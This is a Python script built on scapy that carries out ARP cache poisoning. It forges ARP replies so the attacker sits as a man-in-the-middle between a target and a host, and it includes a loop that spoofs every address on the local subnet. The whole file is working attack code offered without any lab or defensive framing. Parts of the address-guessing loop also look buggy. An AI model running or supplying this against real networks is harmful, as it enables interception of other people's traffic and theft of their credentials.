import sys
from scapy.all import *

def spoof(targetIp, hostIp, attackerIp, inf):
    targetMac = getmacbyip(targetIp)
    attackerMac = get_if_hwaddr(inf) #get attacker MAC
    hostMac = getmacbyip(hostIp)
    
    #send packet "host" to server    
    arp = Ether() / ARP()
    arp[Ether].src = attackerMac
    arp[ARP].hwsrc = attackerMac
    arp[ARP].psrc = hostIp
    arp[ARP].hwdst = targetMac
    arp[ARP].pdst = targetIp
        
    sendp(arp, iface=inf)
    
    #send packet "server" to host
    arp2 = Ether() / ARP()
    arp2[Ether].src = attackerMac
    arp2[ARP].hwsrc = attackerMac
    arp2[ARP].psrc = targetIp
    arp2[ARP].hwdst = hostMac
    arp2[ARP].pdst = hostIp

    sendp(arp2, iface=inf)

def guess(targetIP):
    y = 0
    z = 0
    for x in targetIP:
        if x in ["."]:
            y = y + 1
        if y == 3:
            z = z + 1
    z = z - 1
    guessIP = targetIP[:-z]
    return guessIP
        
def full_spoof(targetIP, hostIP, attackerIP, inf):
    #loop trough every ip that could be on your network and be the MITM on all of them
    guessIP = guess(targetIP)
    for x in range(0, 255):
        y = str(x)
        targetIP = targetIP + y
        spoof(targetIP, hostIP, attackerIP, inf)
        targetIP = guessIP
        
def end_spoof(targetIp, hostIp, attackerIp, inf):
    targetMac = getmacbyip(targetIp)
    attackerMac = getmacbyip(attackerIp)
    hostMac = getmacbyip(hostIp)
        
    #undo ARP spoofing
    correctARP = Ether() / ARP()
    correctARP[Ether].src = attackerMac
    correctARP[ARP].hwsrc = hostMac
    correctARP[ARP].psrc = hostIp
    correctARP[ARP].hwdst = targetMac
    correctARP[ARP].pdst = targetIp
    sendp(correctARP, iface=inf)
